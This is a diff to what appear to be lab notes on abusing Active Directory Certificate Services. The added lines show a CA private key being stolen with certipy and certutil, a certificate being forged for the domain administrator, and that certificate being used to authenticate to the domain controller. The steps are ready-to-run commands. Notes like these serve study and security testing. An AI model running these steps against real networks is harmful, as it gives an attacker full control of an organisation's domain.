@@ -53,15 +53,15 @@ and it has:
 ***
 ## How the CA Key Is Stolen:
 
-### 1 - If you have access on a local admin on the machine:
+### 1 - If you have access on a local admin on the CA server:
 
+we can extract the private key of the CA:
+```bash
+certipy ca -backup -target 10.10.111.10 -u esc5user -p ESC5password
+```
 
+This command saves the CA's certificate and its private signing key to `LOL-CA.pfx`. **This is the "crown jewel" for an attacker.**
 
-
-
-
-
-***
 ### 2- Exporting the certificate from cert store:
 
 view the cert store:
@@ -76,4 +76,18 @@ certutil.exe -exportPFX My 75b2f4bbf31f108945147b466131bdca cert.pfx
 ```
 
 With the .pfx in our hands we can proceed to forge our own certificate for the Administrator account and then finally achieve our final access.
- 
+
+---
+## Exploitation:
+
+after getting the `.pfx` that have the private key of the CA:
+
+1. forge a certificate for administrator (because we have the private key of the CA and we can sign with it any cert):
+```bash
+certipy forge -ca-pfx 'LOL-CA.pfx' -upn 'administrator@lol.local'
+```
+2. authenticate:
+```bash
+certipy auth -pfx 'administrator_forged.pfx' -dc-ip '10.10.111.10'
+```
+
